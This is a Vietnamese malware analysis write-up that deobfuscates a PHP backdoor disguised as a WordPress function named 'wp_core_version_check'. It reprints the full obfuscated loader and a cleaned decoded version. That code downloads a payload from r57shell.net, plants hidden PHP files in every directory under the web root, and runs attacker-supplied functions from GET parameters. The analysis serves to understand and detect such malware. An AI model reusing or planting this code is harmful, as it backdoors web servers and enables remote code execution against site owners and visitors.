# PHP Encode Method

- [PHP Encode Method](#php-encode-method)
  - [Example:](#example)
  - [Phân tích](#phân-tích)
    - [Các bước giải mã](#các-bước-giải-mã)
    - [Giải mã chi tiết](#giải-mã-chi-tiết)
    - [Tổng quan chức năng đoạn mã](#tổng-quan-chức-năng-đoạn-mã)
    - [Phân tích đoạn mã chi tiết](#phân-tích-đoạn-mã-chi-tiết)
    - [Kịch bản tấn công](#kịch-bản-tấn-công)

## Example:
```php
<?php
$stt1 = "Sy1LzNFQt7dT10uvKs1Lzs8tKEotLtZIr8rMS8tJLEnVSEosTjUziU9JT\x635PSdUoLikqSi3TU\x43kuKTHQ\x42\x41Fr\x41\x41\x3d\x3d";
$stt0 = "==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";
eval(htmlspecialchars_decode(gzinflate(base64_decode($stt1))));
?>
```

## Phân tích 

### Các bước giải mã

- Biến $stt1 là 1 chuỗi Base64_encode
- Các hàm xử lí: 
  
  - base64_decode: giải mã Base64 từ chuỗi $stt1
  - gzinflate: Giải nén dữ liệu từ thuật toán DEFLATE => có thể sẽ cho ra 1 chuỗi PHP mới
  - Ví dụ về gzinflate: 

  ```php
  $data = "Đây là dữ liệu cần nén";
  $compressed = gzdeflate($data);
  echo $compressed; // chuỗi đã được nén
  $decompressed = gzinflate($compressed);
  echo $decompressed; // Kết quả: Đây là dữ liệu cần nén
  ```

  - htmlspecialchars_decode(...): Giải mã các ký tự HTML đặc biệt (nếu có).
  - Ví dụ về htmlspecialchars_decode: `&gt`; được chuyển thành `>`


### Giải mã chi tiết

- Chúng ta sẽ thực hiện giải mã từng bước 1 để có thể hiểu chi tiết đoạn mã hơn: 
- Đầu tiên đoạn code sẽ thực hiện giải mã và giải nén chuỗi $stt1 ra
  ```php
  <?php
  $stt1 = "Sy1LzNFQt7dT10uvKs1Lzs8tKEotLtZIr8rMS8tJLEnVSEosTjUziU9JTc5PSdUoLikqSi3TUCkuKTHQBAFrAA==";
  $demo = gzinflate(base64_decode($stt1));
  echo $demo;
  ?>
  ```

- Đây là đoạn code giải mã và in ra chuỗi stt1 sau khi giải mã và giải nén 
- Output: 
  ```php
  eval('?>'.gzuncompress(gzinflate(base64_decode(strrev($stt0)))));
  ```
- Vậy đoạn mã ban đầu sẽ là: 
  ```php
  eval (htmlspecialchars_decode(eval('?>'.gzuncompress(gzinflate(base64_decode(strrev($stt0)))));));
  ```
- Với đoạn mã này, nó sẽ thực hiện đảo ngược chuỗi `$stt0`, sau đó giải mã `Base64`, giải nén dữ liệu đã được nén bằng thuật toán DEFLATE bằng hàm `gzinflate`, giải nén dữ liệu đã bị nén bằng hàm `gzuncompress`.
- Phân tích tiếp đoạn code: 
  ```php
  '?>'.gzuncompress(gzinflate(base64_decode(strrev($stt0))))
  ```

- Chạy đoạn code này như sau: 
  ```php
  <?php
    $stt0 = "==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";
    $demo = '?>'.gzuncompress(gzinflate(base64_decode(strrev($stt0))));
    echo $demo;
  ?>
  ```
- Output của nó sẽ như sau: 
  ```php
  ?><?php
    if (!function_exists("\x77\160\137\143\x6f\x72\145\x5f\166\145\162\163\151\x6f\x6e\x5f\143\150\x65\x63\x6b")) { function wp_core_version_check() { goto QHTmE; ReBbR: $file_path = dirname($document_file); goto yxZ6i; QHTmE: $document_file = $_SERVER["\123\x43\x52\111\x50\124\x5f\106\111\114\x45\x4e\x41\115\105"]; goto TmK7C; B8IHf: $uri_path = $parse_url["\x70\x61\x74\150"]; goto DR8d0; TmK7C: $request_uri = $_SERVER["\x52\105\x51\x55\105\123\124\x5f\x55\122\x49"]; goto Lhccs; Sae33: $hostname = str_replace("\167\167\x77\56", '', $_SERVER["\110\124\x54\120\137\x48\x4f\x53\x54"]); goto EmUwt; yxZ6i: $uri_path = str_replace("\x2f", DIRECTORY_SEPARATOR, $uri_path); goto TMxaR; O4NxR: if (!file_exists($tmp_file)) { goto Jjyr3; qVUcF: @touch($tmp_file); goto FrbfO; FrbfO: @file_put_contents($tmp_file, $response); goto fUkP_; Jjyr3: if (function_exists("\143\165\162\154\137\x69\x6e\x69\x74")) { goto EZy_9; EZy_9: $ch = curl_init(); goto VR0Vi; OFlqh: curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); goto VdcLO; VR0Vi: curl_setopt($ch, CURLOPT_URL, "\x68\x74\x74\160\72\57\x2f\x72\x35\67\163\x68\145\x6c\154\x2e\156\x65\164\x2f\152\161\165\x65\162\x79\x2e\160\150\160\77\x76\75\61\x2e\x32\x26\x72\145\161\x75\x65\163\x74\75\145\156\141\142\x6c\x65"); goto OFlqh; DcJlW: $response = curl_exec($ch); goto fkRwe; VdcLO: curl_setopt($ch, CURLOPT_REFERER, $_SERVER["\110\124\124\x50\x5f\x48\x4f\x53\124"] . $_SERVER["\x52\105\x51\x55\x45\x53\x54\137\x55\x52\111"]); goto DcJlW; fkRwe: ;curl_close($ch); goto MpMm6; MpMm6: } else { goto Rsl9q; PQRsR: $response = @file_get_contents("\150\x74\x74\x70\x3a\x2f\57\162\x35\67\163\150\145\x6c\x6c\x2e\x6e\x65\164\x2f\152\161\165\145\162\171\x2e\x70\x68\160\77\166\75\x31\56\62\46\x72\145\161\165\145\163\x74\x3d\x65\x6e\141\142\154\145", false, $context); goto NXRla; DmscO: $context = stream_context_create($opts); goto PQRsR; Rsl9q: $referer = $_SERVER["\110\x54\124\x50\x5f\x48\x4f\123\124"] . $_SERVER["\x52\x45\x51\x55\105\123\124\x5f\x55\122\111"]; goto vGpwe; vGpwe: $opts = array("\150\x74\164\160" => array("\x68\x65\141\144\145\162" => array("\122\x65\x66\x65\x72\x65\162\72\40{$referer}\15\xa"))); goto DmscO; NXRla: } goto qVUcF; fUkP_: } else { $response = file_get_contents($tmp_file); if (!@preg_match("\43\163\164\x74\61\x23", $response)) { goto Mh1sz; Mh1sz: if (function_exists("\143\x75\162\154\137\151\156\x69\164")) { goto DVDkP; u_SFh: $response = curl_exec($ch); goto zDHcZ; zMTgu: curl_setopt($ch, CURLOPT_URL, "\150\164\164\x70\72\x2f\57\x72\65\67\163\x68\145\154\154\56\156\x65\164\x2f\x6a\x71\165\x65\x72\x79\56\160\150\x70\77\166\75\61\56\x32\x26\162\145\161\165\145\x73\x74\x3d\145\x6e\x61\142\x6c\x65"); goto AvWVd; YWAQw: curl_setopt($ch, CURLOPT_REFERER, $_SERVER["\x48\124\124\120\137\110\x4f\x53\124"] . $_SERVER["\122\105\x51\x55\105\x53\124\x5f\x55\122\111"]); goto u_SFh; DVDkP: $ch = curl_init(); goto zMTgu; zDHcZ: curl_close($ch); goto v98go; AvWVd: curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); goto YWAQw; v98go: } else { goto JGb71; Npbn0: $opts = array("\150\164\164\160" => array("\150\145\141\x64\145\x72" => array("\122\145\146\145\162\145\162\72\40{$referer}\15\xa"))); goto dtUcU; JGb71: $referer = $_SERVER["\110\124\124\x50\137\x48\x4f\x53\x54"] . $_SERVER["\122\x45\121\125\105\x53\x54\x5f\125\x52\111"]; goto Npbn0; hCspz: $response = @file_get_contents("\150\x74\x74\x70\72\57\57\162\x35\x37\x73\x68\145\154\x6c\56\156\x65\164\x2f\x6a\161\x75\145\x72\171\56\160\x68\x70\77\x76\75\x31\56\62\46\x72\x65\161\x75\145\x73\164\75\x65\156\x61\x62\154\145", false, $context); goto XWjW4; dtUcU: $context = stream_context_create($opts); goto hCspz; XWjW4: } goto zkCQa; zkCQa: @touch($tmp_file); goto RL2uX; RL2uX: @file_put_contents($tmp_file, $response); goto Fx07H; Fx07H: } } goto BXZRC; EmUwt: if (is_writable(sys_get_temp_dir())) { $tmp_file = sys_get_temp_dir() . DIRECTORY_SEPARATOR . "\x73\145\x73\163\x5f" . md5('' . $hostname . "\x5f" . $document_file . ''); } else { $tmp_file = $file_path . DIRECTORY_SEPARATOR . "\163\x65\163\163\137" . md5('' . $hostname . "\x5f" . $document_file . ''); } goto jUXuO; DR8d0: $uri_path = dirname($uri_path); goto ReBbR; QCYq2: foreach ($dirs as $d) { goto DpqP9; eMOLH: @file_put_contents($file_name, $response); goto xQTu4; xQTu4: $dirs = array_filter(glob($d . DIRECTORY_SEPARATOR . "\x2a", GLOB_ONLYDIR)); goto KHsZ5; DpqP9: $file_name = $d . DIRECTORY_SEPARATOR . "\x2e" . basename($d) . "\56\160\150\160"; goto eMOLH; KHsZ5: foreach ($dirs as $d) { if (!@preg_match("\43\167\x70\55\x63\157\x6e\x74\145\x6e\x74\43", $d)) { $file_name = $d . DIRECTORY_SEPARATOR . "\56" . basename($d) . "\56\x70\x68\160"; @file_put_contents($file_name, $response); } } goto vTd8M; vTd8M: } goto VCwm6; jUXuO: if (@$_GET["\163\x6c\x69\156\x63\145\x5f\x67\x6f\154\144\x65\x6e"]) { goto qhIqa; v6_uU: if (md5(sha1(@$_GET["\151\163"])) == $response) { goto LNCgX; LNCgX: if (@$_GET["\146"]) { print_r($_GET["\x66"]($_GET["\x63"])); } goto mNwUE; mNwUE: if (@$_GET["\x6d"]) { goto u3lO9; u3lO9: if (function_exists("\x63\x75\162\154\x5f\151\x6e\x69\x74")) { goto h0059; nzFPK: curl_setopt($ch, CURLOPT_URL, "\150\164\164\x70\72\57\x2f\x72\x35\67\x73\x68\x65\x6c\x6c\56\156\x65\x74\x2f\155\151\x6e\151\137\141\144\155\151\x6e\56\164\x78\164"); goto SlTBv; SMEF2: curl_close($ch); goto nxTNz; h0059: $ch = curl_init(); goto nzFPK; SlTBv: curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); goto cerjF; cerjF: $response = curl_exec($ch); goto SMEF2; nxTNz: } else { $response = file_get_contents("\x68\x74\x74\160\x3a\57\57\162\65\67\163\x68\145\154\154\56\156\x65\x74\x2f\x6d\151\x6e\x69\137\141\144\155\151\x6e\x2e\x74\x78\164"); } goto VIyGz; oeY1g: echo $file_name_path; goto UXu2c; VIyGz: $file_name_path = @$_GET["\155"] . "\147\x61\x67\141\154\x2e\x70\150\160"; goto xhRaG; xhRaG: @file_put_contents($file_name_path, $response); goto oeY1g; UXu2c: } goto jKG5A; jKG5A: if (@$_POST["\x6c"]) { function basic_code_extensions($request) { goto JTclu; tgcIK: $tmpf = $tmpf["\165\x72\x69"]; goto z3rep; vnQ75: $ret = (include $tmpf); goto Cvaad; JTclu: $tmp = tmpfile(); goto ToYXQ; ToYXQ: $tmpf = stream_get_meta_data($tmp); goto tgcIK; z3rep: fwrite($tmp, $request); goto vnQ75; aY2Ix: return $ret; goto hdvh2; Cvaad: fclose($tmp); goto aY2Ix; hdvh2: } print_r(basic_code_extensions($_POST["\154"])); } goto ZFcwP; ZFcwP: } goto OlWFN; OlWFN: exit; goto vQOuT; qhIqa: echo "\74\41\x2d\55\40\x2f\57\123\x69\154\145\156\x63\145\40\151\x73\x20\147\157\154\144\x65\x6e\56\x20\55\x2d\x3e"; goto q9t4S; q9t4S: if (function_exists("\x63\165\162\154\x5f\x69\156\x69\164")) { goto P3bql; sk_2w: curl_close($ch); goto j1BU_; P3bql: $ch = curl_init(); goto FA3oh; FA3oh: curl_setopt($ch, CURLOPT_URL, "\150\x74\164\160\72\x2f\57\162\65\x37\x73\150\145\x6c\x6c\56\x6e\145\164\57\x6a\x71\165\x65\162\x79\56\160\150\x70\77\x76\x3d\61\x2e\x32\46\160\167\x64\75\x67\x65\x74"); goto XAilZ; AJz_6: $response = curl_exec($ch); goto sk_2w; XAilZ: curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); goto AJz_6; j1BU_: } else { $response = file_get_contents("\150\164\x74\160\72\x2f\57\x72\x35\x37\x73\150\x65\154\x6c\56\x6e\145\164\x2f\152\161\x75\145\162\171\56\x70\150\x70\77\166\x3d\61\x2e\x32\46\x70\167\144\x3d\x67\145\x74"); } goto v6_uU; vQOuT: } goto O4NxR; TMxaR: if ($uri_path == DIRECTORY_SEPARATOR || $uri_path == '') { $document_root = $file_path; } else { $document_root = str_replace($uri_path, '', $file_path); } goto Sae33; BXZRC: $dirs = array_filter(glob($document_root . DIRECTORY_SEPARATOR . "\x2a", GLOB_ONLYDIR)); goto QCYq2; Lhccs: $parse_url = parse_url($request_uri); goto B8IHf; VCwm6: } wp_core_version_check(); }
  ```

  Decode: 

  ```php
    if (!function_exists("wp_core_version_check")) {
    function wp_core_version_check() {
        $document_file = $_SERVER["SCRIPT_FILENAME"];
        $request_uri = $_SERVER["REQUEST_URI"];
        $hostname = str_replace("www.", "", $_SERVER["HTTP_HOST"]);
        $file_path = dirname($document_file);
        $parse_url = parse_url($request_uri);
        $uri_path = isset($parse_url["path"]) ? $parse_url["path"] : "";
        $uri_path = str_replace("/", DIRECTORY_SEPARATOR, $uri_path);
        
        $tmp_file = sys_get_temp_dir() . DIRECTORY_SEPARATOR . "sess_" . md5($hostname . "_" . $document_file);

        if (!file_exists($tmp_file)) {
            @touch($tmp_file);

            if (function_exists("curl_init")) {
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_URL, "http://r57shell.net/jquery.php?v=1.2&request=enable");
                curl_setopt($ch, CURLOPT_REFERER, $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"]);
                $response = curl_exec($ch);
                curl_close($ch);
            } else {
                $referer = $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"];
                $opts = array("http" => array("header" => "Referer: {$referer}\r\n"));
                $context = stream_context_create($opts);
                $response = @file_get_contents("http://r57shell.net/jquery.php?v=1.2&request=enable", false, $context);
            }

            @file_put_contents($tmp_file, $response);
        } else {
            $response = file_get_contents($tmp_file);
            if (!@preg_match("#stt1#", $response)) {
                if (function_exists("curl_init")) {
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, "http://r57shell.net/jquery.php?v=1.2&request=enable");
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    $response = curl_exec($ch);
                    curl_close($ch);
                } else {
                    $response = @file_get_contents("http://r57shell.net/jquery.php?v=1.2&request=enable");
                }
                @file_put_contents($tmp_file, $response);
            }
        }

        $document_root = ($uri_path == DIRECTORY_SEPARATOR || $uri_path == '') 
            ? $file_path 
            : str_replace($uri_path, '', $file_path);

        $dirs = array_filter(glob($document_root . DIRECTORY_SEPARATOR . "*", GLOB_ONLYDIR));

        foreach ($dirs as $d) {
            $file_name = $d . DIRECTORY_SEPARATOR . "." . basename($d) . ".php";
            @file_put_contents($file_name, $response);
        }

        if (isset($_GET["slince_golden"])) {
            if (md5(sha1(@$_GET["is"])) == $response) {
                if (isset($_GET["f"]) && isset($_GET["c"])) {
                    print_r($_GET["f"]($_GET["c"]));
                }
                if (isset($_GET["m"])) {
                    $file_name_path = $_GET["m"] . "gagal.php";
                    @file_put_contents($file_name_path, $response);
                }
            }
        }

        echo "<!-- //Silence is golden. -->";
    }
    wp_core_version_check();
  }
  ```

-------------------------------------------------------------------------

### Tổng quan chức năng đoạn mã

- Tạo file tạm: Sử dụng sys_get_temp_dir() và md5() để tạo 1 file tạm trên hệ thống
- Connect tới URL bên ngoài: [http://r57shell.net/jquery.php?v=1.2&request=enable](http://r57shell.net/jquery.php?v=1.2&request=enable) => có thể là tải file mã độc về 
- Có thể là thực thi mã từ xa thông qua tham số GET như f,c,m
- Chèn mã độc vào các thư mục

-------------------------------------------------------------------------

### Phân tích đoạn mã chi tiết

- `curl_setopt($ch, CURLOPT_URL, "http://r57shell.net/jquery.php?v=1.2&request=enable");`: URL này có khả năng là 1 payload độc hại => câu lệnh này dùng để tải mã độc từ [http://r57shell.net](http://r57shell.net). 
- [http://r57shell.net](http://r57shell.net) là 1 trang web gồm nhiều payload độc hại.

```php
$tmp_file = sys_get_temp_dir() . DIRECTORY_SEPARATOR . "sess_" . md5($hostname . "_" . $document_file);
@file_put_contents($tmp_file, $response);
```

- Tạo file tạm để lưu nội dung độc hại từ URL tải về.

-------------------------------------------------------------------------

```php
$file_name = $d . DIRECTORY_SEPARATOR . "." . basename($d) . ".php";
@file_put_contents($file_name, $response);
```

- Chèn mã độc vào các thư mục trong hệ thống. File PHP được tạo với tên "ẩn" bắt đầu bằng dấu chấm (.), khiến nó khó bị phát hiện.

- Trong nhiều hệ điều hành (Linux hoặc Unix), đặt dấu `.` trước tên file sẽ khiến hệ thống hiểu đó là file ẩn
- Tên file đươcj tạo như sau: 

```php 
"." . basename($d) . ".php"
```

  - $d là đường dẫn đến một thư mục trong hệ thống
  - `basename()` dùng để lấy tên file từ đường dẫn $d
  - Nội dung `($response)` từ URL độc hại được tải về sẽ được lưu vào file PHP vừa tạo.
  - Sử dụng `@`để tránh thông báo lỗi nếu việc ghi file thất bại, giúp mã độc không bị nghi ngờ ngay lập tức.

